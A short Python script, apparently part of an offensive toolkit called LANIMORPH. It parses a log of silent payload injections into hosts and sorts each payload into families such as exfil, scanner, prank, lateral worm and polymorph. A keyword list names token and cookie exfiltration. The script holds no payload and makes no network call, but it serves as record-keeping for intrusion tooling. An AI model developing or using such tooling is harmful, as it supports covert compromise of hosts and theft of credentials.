#!/usr/bin/env python3
import os

log_path = os.path.expanduser("~/LANIMORPH/logs/inject_silent.log")
mem_db = os.path.expanduser("~/LANIMORPH/chain/mutation_memory.db")

# Parse mutations from log
mem = {}
if os.path.exists(log_path):
    with open(log_path, "r", errors="ignore") as f:
        for line in f:
            if "silent:" not in line or "using" not in line:
                continue
            parts = line.strip().split()
            try:
                host = parts[-3]
                payload = parts[-1]
                fam = "unknown"
                name = os.path.basename(payload)
                if any(x in name for x in ["exfil", "dump", "token", "cookie"]): fam = "exfil"
                elif any(x in name for x in ["map", "scan", "finger", "bluetooth"]): fam = "scanner"
                elif any(x in name for x in ["prank", "fake", "flash", "scream"]): fam = "prank"
                elif any(x in name for x in ["worm", "crawl", "chain"]): fam = "lateral"
                elif any(x in name for x in ["mirror", "mimic", "polymorph", "skin"]): fam = "polymorph"
                else: fam = "other"
                mem.setdefault(host, []).append(fam)
            except Exception:
                continue

# Save mutation memory
with open(mem_db, "w") as f:
    for host, families in mem.items():
        f.write(f"{host}: {','.join(families)}\n")

print("[✓] Mutation memory saved to: mutation_memory.db")
